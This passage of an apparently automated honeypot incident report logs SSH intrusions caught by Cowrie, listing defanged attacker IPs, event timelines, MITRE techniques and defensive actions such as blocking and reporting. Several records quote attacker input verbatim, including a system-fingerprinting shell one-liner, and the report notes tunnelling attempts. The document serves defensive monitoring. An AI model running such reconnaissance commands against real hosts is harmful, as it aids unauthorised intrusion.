| `2026-08-20 19:45:06` | `cowrie.command.failed` |
| `2026-08-20 19:45:06` | `cowrie.command.input` |
| `2026-08-20 19:45:06` | `cowrie.command.failed` |
| `2026-08-20 19:45:06` | `cowrie.command.input` |
| `2026-08-20 19:45:13` | `cowrie.log.closed` |
| `2026-08-20 19:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.101[.]246` to AbuseIPDB if not already reported
- [ ] Block `138.68.101[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd5215695959

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:06` | `cowrie.session.connect` |
| `2026-08-20 19:45:06` | `cowrie.client.version` |
| `2026-08-20 19:45:06` | `cowrie.client.kex` |
| `2026-08-20 19:45:06` | `cowrie.login.success` |
| `2026-08-20 19:45:07` | `cowrie.session.params` |
| `2026-08-20 19:45:07` | `cowrie.command.input` |
| `2026-08-20 19:45:07` | `cowrie.log.closed` |
| `2026-08-20 19:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0feef8ff2fdb

| Field | Detail |
|---|---|
| **Source IP** | `207.154.233[.]124` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (compatible; Odin; hxxps://docs.getodin.com/), Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:13` | `cowrie.session.connect` |
| `2026-08-20 19:45:13` | `cowrie.login.success` |
| `2026-08-20 19:45:14` | `cowrie.session.params` |
| `2026-08-20 19:45:14` | `cowrie.command.input` |
| `2026-08-20 19:45:14` | `cowrie.command.input` |
| `2026-08-20 19:45:14` | `cowrie.command.failed` |
| `2026-08-20 19:45:14` | `cowrie.command.input` |
| `2026-08-20 19:45:14` | `cowrie.command.failed` |
| `2026-08-20 19:45:14` | `cowrie.command.input` |
| `2026-08-20 19:45:15` | `cowrie.log.closed` |
| `2026-08-20 19:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.233[.]124` to AbuseIPDB if not already reported
- [ ] Block `207.154.233[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9538d798cbc8

| Field | Detail |
|---|---|
| **Source IP** | `167.99.243[.]59` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:14` | `cowrie.session.connect` |
| `2026-08-20 19:45:14` | `cowrie.login.success` |
| `2026-08-20 19:45:15` | `cowrie.session.params` |
| `2026-08-20 19:45:15` | `cowrie.command.input` |
| `2026-08-20 19:45:15` | `cowrie.command.failed` |
| `2026-08-20 19:45:15` | `cowrie.command.input` |
| `2026-08-20 19:45:15` | `cowrie.command.failed` |
| `2026-08-20 19:45:15` | `cowrie.command.input` |
| `2026-08-20 19:45:15` | `cowrie.log.closed` |
| `2026-08-20 19:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.243[.]59` to AbuseIPDB if not already reported
- [ ] Block `167.99.243[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6bb7ad68eb1

| Field | Detail |
|---|---|
| **Source IP** | `167.99.243[.]59` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:15` | `cowrie.session.connect` |
| `2026-08-20 19:45:15` | `cowrie.login.success` |
| `2026-08-20 19:45:15` | `cowrie.session.params` |
| `2026-08-20 19:45:15` | `cowrie.command.input` |
| `2026-08-20 19:45:15` | `cowrie.command.failed` |
| `2026-08-20 19:45:15` | `cowrie.command.input` |
| `2026-08-20 19:45:15` | `cowrie.command.failed` |
| `2026-08-20 19:45:15` | `cowrie.command.input` |
| `2026-08-20 19:45:16` | `cowrie.log.closed` |
| `2026-08-20 19:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.243[.]59` to AbuseIPDB if not already reported
- [ ] Block `167.99.243[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5613d929d0cd

| Field | Detail |
|---|---|
| **Source IP** | `167.99.243[.]59` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:16` | `cowrie.session.connect` |
| `2026-08-20 19:45:16` | `cowrie.login.success` |
| `2026-08-20 19:45:16` | `cowrie.session.params` |
| `2026-08-20 19:45:16` | `cowrie.command.input` |
| `2026-08-20 19:45:16` | `cowrie.command.failed` |
| `2026-08-20 19:45:16` | `cowrie.command.input` |
| `2026-08-20 19:45:16` | `cowrie.command.failed` |
| `2026-08-20 19:45:16` | `cowrie.command.input` |
| `2026-08-20 19:45:16` | `cowrie.log.closed` |
| `2026-08-20 19:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.243[.]59` to AbuseIPDB if not already reported
- [ ] Block `167.99.243[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7fa20f7464b

| Field | Detail |
|---|---|
| **Source IP** | `167.99.243[.]59` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:16` | `cowrie.session.connect` |
| `2026-08-20 19:45:16` | `cowrie.login.success` |
| `2026-08-20 19:45:17` | `cowrie.session.params` |
| `2026-08-20 19:45:17` | `cowrie.command.input` |
| `2026-08-20 19:45:17` | `cowrie.command.failed` |
| `2026-08-20 19:45:17` | `cowrie.command.input` |
| `2026-08-20 19:45:17` | `cowrie.command.failed` |
| `2026-08-20 19:45:17` | `cowrie.command.input` |
| `2026-08-20 19:45:17` | `cowrie.log.closed` |
| `2026-08-20 19:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.243[.]59` to AbuseIPDB if not already reported
- [ ] Block `167.99.243[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-453434847118

| Field | Detail |
|---|---|
| **Source IP** | `167.99.243[.]59` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:17` | `cowrie.session.connect` |
| `2026-08-20 19:45:17` | `cowrie.login.success` |
| `2026-08-20 19:45:18` | `cowrie.session.params` |
| `2026-08-20 19:45:18` | `cowrie.command.input` |
| `2026-08-20 19:45:18` | `cowrie.command.failed` |
| `2026-08-20 19:45:18` | `cowrie.command.input` |
| `2026-08-20 19:45:18` | `cowrie.command.failed` |
| `2026-08-20 19:45:18` | `cowrie.command.input` |
| `2026-08-20 19:45:18` | `cowrie.log.closed` |
| `2026-08-20 19:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.243[.]59` to AbuseIPDB if not already reported
- [ ] Block `167.99.243[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d112214033a2

| Field | Detail |
|---|---|
| **Source IP** | `167.99.243[.]59` |
| **First Seen** | 2026-08-20 19:45 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:45:18` | `cowrie.session.connect` |
| `2026-08-20 19:45:18` | `cowrie.login.success` |
| `2026-08-20 19:45:18` | `cowrie.session.params` |
| `2026-08-20 19:45:18` | `cowrie.command.input` |
| `2026-08-20 19:45:18` | `cowrie.command.failed` |
| `2026-08-20 19:45:18` | `cowrie.command.input` |
| `2026-08-20 19:45:18` | `cowrie.command.failed` |
| `2026-08-20 19:45:18` | `cowrie.command.input` |
| `2026-08-20 19:45:19` | `cowrie.log.closed` |
| `2026-08-20 19:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.243[.]59` to AbuseIPDB if not already reported
- [ ] Block `167.99.243[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9aec89d03e

| Field | Detail |
|---|---|
| **Source IP** | `222.211.75[.]201` |
| **First Seen** | 2026-08-20 19:48 |
| **Last Seen** | 2026-08-20 19:54 |
| **Session Duration** | 394s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:48:07` | `cowrie.session.connect` |
| `2026-08-20 19:49:40` | `cowrie.client.version` |
| `2026-08-20 19:49:40` | `cowrie.client.kex` |
| `2026-08-20 19:49:41` | `cowrie.login.success` |
| `2026-08-20 19:54:41` | `cowrie.session.file_upload` |
| `2026-08-20 19:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.211.75[.]201` to AbuseIPDB if not already reported
- [ ] Block `222.211.75[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ebd7c44aff5

| Field | Detail |
|---|---|
| **Source IP** | `41.220.3[.]101` |
| **First Seen** | 2026-08-20 19:49 |
| **Last Seen** | 2026-08-20 19:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:49:34` | `cowrie.session.connect` |
| `2026-08-20 19:49:35` | `cowrie.client.version` |
| `2026-08-20 19:49:35` | `cowrie.client.kex` |
| `2026-08-20 19:49:37` | `cowrie.login.success` |
| `2026-08-20 19:49:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.220.3[.]101` to AbuseIPDB if not already reported
- [ ] Block `41.220.3[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08cc2f9a5c0d

| Field | Detail |
|---|---|
| **Source IP** | `61.184.128[.]210` |
| **First Seen** | 2026-08-20 19:49 |
| **Last Seen** | 2026-08-20 19:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:49:43` | `cowrie.session.connect` |
| `2026-08-20 19:49:44` | `cowrie.client.version` |
| `2026-08-20 19:49:44` | `cowrie.client.kex` |
| `2026-08-20 19:49:46` | `cowrie.login.success` |
| `2026-08-20 19:49:47` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.184.128[.]210` to AbuseIPDB if not already reported
- [ ] Block `61.184.128[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a2fdfffdeb8

| Field | Detail |
|---|---|
| **Source IP** | `49.124.159[.]194` |
| **First Seen** | 2026-08-20 19:52 |
| **Last Seen** | 2026-08-20 19:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:52:53` | `cowrie.session.connect` |
| `2026-08-20 19:52:54` | `cowrie.client.version` |
| `2026-08-20 19:52:54` | `cowrie.client.kex` |
| `2026-08-20 19:52:57` | `cowrie.login.success` |
| `2026-08-20 19:52:58` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.159[.]194` to AbuseIPDB if not already reported
- [ ] Block `49.124.159[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dd938cf4a08

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-08-20 19:53 |
| **Last Seen** | 2026-08-20 19:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:53:03` | `cowrie.session.connect` |
| `2026-08-20 19:53:04` | `cowrie.client.version` |
| `2026-08-20 19:53:04` | `cowrie.client.kex` |
| `2026-08-20 19:53:07` | `cowrie.login.success` |
| `2026-08-20 19:53:09` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f8053bc15b0

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-08-20 19:53 |
| **Last Seen** | 2026-08-20 19:58 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:53:11` | `cowrie.session.connect` |
| `2026-08-20 19:53:11` | `cowrie.client.version` |
| `2026-08-20 19:53:11` | `cowrie.client.kex` |
| `2026-08-20 19:53:14` | `cowrie.login.success` |
| `2026-08-20 19:53:14` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d991d0d9a9d9

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-08-20 19:53 |
| **Last Seen** | 2026-08-20 19:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:53:20` | `cowrie.session.connect` |
| `2026-08-20 19:53:21` | `cowrie.client.version` |
| `2026-08-20 19:53:21` | `cowrie.client.kex` |
| `2026-08-20 19:53:24` | `cowrie.login.success` |
| `2026-08-20 19:53:26` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-928c35b2d54e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 19:54 |
| **Last Seen** | 2026-08-20 19:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:54:36` | `cowrie.session.connect` |
| `2026-08-20 19:54:36` | `cowrie.client.version` |
| `2026-08-20 19:54:37` | `cowrie.client.kex` |
| `2026-08-20 19:54:40` | `cowrie.login.success` |
| `2026-08-20 19:54:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:54:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 19:54:48` | `cowrie.direct-tcpip.data` |
| `2026-08-20 19:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5c260a84361

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 19:54 |
| **Last Seen** | 2026-08-20 19:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:54:49` | `cowrie.session.connect` |
| `2026-08-20 19:54:49` | `cowrie.client.version` |
| `2026-08-20 19:54:50` | `cowrie.client.kex` |
| `2026-08-20 19:54:53` | `cowrie.login.success` |
| `2026-08-20 19:54:53` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:54:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 19:54:53` | `cowrie.direct-tcpip.data` |
| `2026-08-20 19:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1129cd80189f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-20 19:55 |
| **Last Seen** | 2026-08-20 19:55 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:55:44` | `cowrie.session.connect` |
| `2026-08-20 19:55:46` | `cowrie.client.version` |
| `2026-08-20 19:55:46` | `cowrie.client.kex` |
| `2026-08-20 19:55:51` | `cowrie.login.success` |
| `2026-08-20 19:55:55` | `cowrie.session.params` |
| `2026-08-20 19:55:55` | `cowrie.command.input` |
| `2026-08-20 19:55:55` | `cowrie.command.input` |
| `2026-08-20 19:55:55` | `cowrie.command.input` |
| `2026-08-20 19:55:55` | `cowrie.command.input` |
| `2026-08-20 19:55:55` | `cowrie.command.input` |
| `2026-08-20 19:55:55` | `cowrie.command.success` |
| `2026-08-20 19:55:55` | `cowrie.command.input` |
| `2026-08-20 19:55:55` | `cowrie.command.input` |
| `2026-08-20 19:55:55` | `cowrie.command.input` |
| `2026-08-20 19:55:55` | `cowrie.command.input` |
| `2026-08-20 19:55:56` | `cowrie.log.closed` |
| `2026-08-20 19:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0849ba580816

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-20 19:58 |
| **Last Seen** | 2026-08-20 19:58 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:58:40` | `cowrie.session.connect` |
| `2026-08-20 19:58:41` | `cowrie.client.version` |
| `2026-08-20 19:58:41` | `cowrie.client.kex` |
| `2026-08-20 19:58:48` | `cowrie.login.success` |
| `2026-08-20 19:58:50` | `cowrie.session.params` |
| `2026-08-20 19:58:50` | `cowrie.command.input` |
| `2026-08-20 19:58:50` | `cowrie.command.input` |
| `2026-08-20 19:58:50` | `cowrie.command.input` |
| `2026-08-20 19:58:51` | `cowrie.command.input` |
| `2026-08-20 19:58:51` | `cowrie.command.input` |
| `2026-08-20 19:58:51` | `cowrie.command.success` |
| `2026-08-20 19:58:51` | `cowrie.command.input` |
| `2026-08-20 19:58:51` | `cowrie.command.input` |
| `2026-08-20 19:58:51` | `cowrie.command.input` |
| `2026-08-20 19:58:51` | `cowrie.command.input` |
| `2026-08-20 19:58:51` | `cowrie.log.closed` |
| `2026-08-20 19:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10981081f860

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-20 20:01 |
| **Last Seen** | 2026-08-20 20:01 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:01:37` | `cowrie.session.connect` |
| `2026-08-20 20:01:39` | `cowrie.client.version` |
| `2026-08-20 20:01:39` | `cowrie.client.kex` |
| `2026-08-20 20:01:45` | `cowrie.login.success` |
| `2026-08-20 20:01:49` | `cowrie.session.params` |
| `2026-08-20 20:01:49` | `cowrie.command.input` |
| `2026-08-20 20:01:49` | `cowrie.command.input` |
| `2026-08-20 20:01:49` | `cowrie.command.input` |
| `2026-08-20 20:01:49` | `cowrie.command.input` |
| `2026-08-20 20:01:49` | `cowrie.command.input` |
| `2026-08-20 20:01:49` | `cowrie.command.success` |
| `2026-08-20 20:01:49` | `cowrie.command.input` |
| `2026-08-20 20:01:49` | `cowrie.command.input` |
| `2026-08-20 20:01:49` | `cowrie.command.input` |
| `2026-08-20 20:01:49` | `cowrie.command.input` |
| `2026-08-20 20:01:57` | `cowrie.log.closed` |
| `2026-08-20 20:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-972648d8abd8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-20 20:04 |
| **Last Seen** | 2026-08-20 20:04 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
